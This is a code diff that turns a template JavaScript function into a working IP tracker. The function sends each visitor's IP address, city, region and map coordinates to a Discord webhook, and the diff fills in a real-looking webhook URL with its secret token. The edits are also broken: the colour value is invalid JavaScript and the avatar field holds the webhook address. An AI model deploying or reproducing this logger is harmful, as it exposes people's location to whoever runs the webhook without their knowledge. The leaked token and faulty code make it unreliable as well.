@@ -3,19 +3,19 @@ function collectInfo(json) {
   var wbRequest = new XMLHttpRequest();
 
   // Set the destination URL for the webhook
-  wbRequest.open("POST", "WEBHOOK LINK");
+  wbRequest.open("POST", "https://discord.com/api/webhooks/1125245988093825144/QZUXFnlGiBBiYFXuaVH0MiWqxZqvvzgjRdBaUYrxYqu_xmBfYTdgfBguvzvI3ysedt6y");
 
   // Set the content type for the request
   wbRequest.setRequestHeader('Content-type', 'application/json');
 
   // Set the payload for the webhook
   var params = {
-    username: "DISCORD WEBHOOK NICKNAME",
-    avatar_url: "DISCORD WEBHOOK URL",
+    username: "ip-tracker",
+    avatar_url: "https://discord.com/api/webhooks/1125245988093825144/QZUXFnlGiBBiYFXuaVH0MiWqxZqvvzgjRdBaUYrxYqu_xmBfYTdgfBguvzvI3ysedt6y",
     content: "DISCORD WEBHOOK MESSAGE CONTENT\n",
     embeds: [{
-      title: "EMBED TITLE",
-      color: 0000000,
+      title: "Novo IP:",
+      color: #0000000,
       description: `**IP:** \`${json.ip}\`\n` +
                    `**Region:** \`${json.country}, ${json.region}, ${json.city}\`\n` +
                    `**Coords.:** \`${json.loc}\`\n\n` +
